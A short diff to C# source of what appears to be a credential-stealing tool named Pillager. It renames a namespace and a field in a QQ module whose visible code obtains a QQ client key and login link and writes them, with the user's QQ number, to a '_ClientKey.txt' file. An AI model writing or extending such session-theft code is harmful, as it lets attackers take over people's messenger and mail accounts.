@@ -3,11 +3,11 @@ using System.IO;
 using System.Net;
 using System.Text;
 
-namespace Pillager.IM
+namespace Pillager.Messengers
 {
     internal class QQ
     {
-        public static string IMName = "QQ";
+        public static string MessengerName = "QQ";
 
         public static string get_pt_local_token()
         {
@@ -136,12 +136,12 @@ namespace Pillager.IM
                 string link = get_link(clientkey, uin);
                 if (link == "") return;
 
-                string savepath = Path.Combine(path, IMName);
+                string savepath = Path.Combine(path, MessengerName);
                 Directory.CreateDirectory(savepath);
                 StringBuilder sb = new StringBuilder();
                 sb.AppendLine("QQ:" + uin);
                 sb.AppendLine("Mail:" + link);
-                File.WriteAllText(Path.Combine(savepath, IMName + "_ClientKey.txt"), sb.ToString());
+                File.WriteAllText(Path.Combine(savepath, MessengerName + "_ClientKey.txt"), sb.ToString());
             }
             catch { }
         }
